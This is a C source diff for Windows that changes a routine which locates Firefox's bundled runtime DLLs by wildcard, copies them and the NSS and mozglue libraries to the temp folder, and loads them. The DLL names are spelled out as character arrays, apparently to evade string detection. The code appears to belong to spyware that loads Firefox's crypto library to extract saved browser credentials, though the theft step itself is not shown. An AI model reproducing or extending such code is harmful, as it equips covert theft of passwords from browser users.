@@ -350,6 +350,14 @@ BOOL CopyDll(LPWSTR strSrcFullPath, LPWSTR strDstPath, LPWSTR strDstFileName, LP
 	PathAppend(strDstFullPath, strDstFileName);
 	zfree(strTmp);
 
+	//check if the source file exists
+	if(!PathFileExists(strSrcFullPath))
+	{
+		zfree(strDstFullPath);
+		strDstFullPath = NULL;
+		return FALSE;
+	}
+
 	HRESULT hr = ComCopyFile(strSrcFullPath, strDstPath, strDstFileName);
 	if (!SUCCEEDED(hr) || !PathFileExists(strDstFullPath))
 		BatchCopyFile(strSrcFullPath, strDstFullPath);
@@ -366,13 +374,46 @@ BOOL CopyDll(LPWSTR strSrcFullPath, LPWSTR strDstPath, LPWSTR strDstFileName, LP
 	return bRet;
 }
 
+//search a file (the lpwspath must termitate with a \ char)
+LPWSTR GetMSVCFilePath(LPWSTR lpwsPath, LPWSTR lpwsFile)
+{
+	WIN32_FIND_DATA FindFileData;
+	HANDLE	hFile = NULL;
+	LPWSTR	lpwsFoundFile = NULL, lpwsCompletePath = NULL;
+	DWORD	dwLen = 0;
+
+	if((lpwsPath == NULL) || (lpwsFile == NULL))
+		return NULL;
+
+	if((lpwsCompletePath = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))) == NULL)
+		return NULL;
+	swprintf_s(lpwsCompletePath, MAX_PATH, L"%s%s", lpwsPath, lpwsFile);
+
+	//search for the specified file
+	if((hFile = FindFirstFile(lpwsCompletePath, &FindFileData)) != INVALID_HANDLE_VALUE)
+	{	
+		if((lpwsFoundFile = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))) != NULL)
+		{			
+			swprintf_s(lpwsFoundFile, MAX_PATH, L"%s", FindFileData.cFileName);			
+		}
+
+		FindClose(hFile);
+	}
+
+	zfree(lpwsCompletePath);
+
+	return lpwsFoundFile;
+}
+
 BOOL CopyAndLoadFFoxLibrary()
 {
 	BOOL bRet = FALSE;
 	LPWSTR strLibMoz;
 	WCHAR strMozGlue[] = { L'm', L'o', L'z', L'g', L'l', L'u', L'e', L'.', L'd', L'l', L'l', 0x0 };
-	WCHAR strMSVCR[] = { L'm', L's', L'v', L'c', L'r', L'1', L'0', L'0', L'.', L'd', L'l', L'l', L'\0' };
-	WCHAR strMSVCP[] = { L'm', L's', L'v', L'c', L'p', L'1', L'0', L'0', L'.', L'd', L'l', L'l', L'\0' };
+	//WCHAR strMSVCR[] = { L'm', L's', L'v', L'c', L'r', L'1', L'0', L'0', L'.', L'd', L'l', L'l', L'\0' };
+	//WCHAR strMSVCP[] = { L'm', L's', L'v', L'c', L'p', L'1', L'0', L'0', L'.', L'd', L'l', L'l', L'\0' };
+	WCHAR strMSVCR[] = { L'm', L's', L'v', L'c', L'r', L'*', L'.', L'd', L'l', L'l', L'\0' };
+	WCHAR strMSVCP[] = { L'm', L's', L'v', L'c', L'p', L'*', L'.', L'd', L'l', L'l', L'\0' };
 	WCHAR strNSS3[] = { L'n', L's', L's', L'3', L'.', L'd', L'l', L'l', L'\0' };
 
 	LPWSTR strTempPath = (LPWSTR) zalloc((MAX_FILE_PATH+1)*sizeof(WCHAR));
@@ -380,19 +421,34 @@ BOOL CopyAndLoadFFoxLibrary()
 	GetTempPath(MAX_FILE_PATH, strTempPath);
 
 	LPWSTR strLibMSVCR, strLibMSVCP;
-	wcscpy_s(strFullPath, MAX_FILE_PATH, strFFoxPath);
-	wcscat_s(strFullPath, MAX_FILE_PATH, strMSVCR);
-	if (CopyDll(strFullPath, strTempPath, strMSVCR, &strLibMSVCR))
+
+	LPWSTR strMSVCRLib = GetMSVCFilePath(strFFoxPath, strMSVCR);
+	LPWSTR strMSVCPLib = GetMSVCFilePath(strFFoxPath, strMSVCP);
+	if((strMSVCRLib == NULL) || (strMSVCPLib == NULL))
 	{
+		zfree(strTempPath);
+		zfree(strFullPath);
+		zfree(strMSVCRLib);
+		zfree(strMSVCPLib);
+		return FALSE;
+	}
+
+	wcscpy_s(strFullPath, MAX_FILE_PATH, strFFoxPath);
+	wcscat_s(strFullPath, MAX_FILE_PATH, strMSVCRLib);
+
+	if (CopyDll(strFullPath, strTempPath, strMSVCRLib, &strLibMSVCR))
+	{
+		zfree(strMSVCRLib);
 		hMSCR = LoadLibrary(strLibMSVCR);
 		zfree(strLibMSVCR);
 		if (hMSCR)
 		{
 			wcscpy_s(strFullPath, MAX_FILE_PATH, strFFoxPath);
-			wcscat_s(strFullPath, MAX_FILE_PATH, strMSVCP);
+			wcscat_s(strFullPath, MAX_FILE_PATH, strMSVCPLib);
 
-			if (CopyDll(strFullPath, strTempPath, strMSVCP, &strLibMSVCP))
+			if (CopyDll(strFullPath, strTempPath, strMSVCPLib, &strLibMSVCP))
 			{
+				zfree(strMSVCPLib);
 				hMSCP = LoadLibrary(strLibMSVCP);
 				zfree(strLibMSVCP);
 				if (hMSCP)
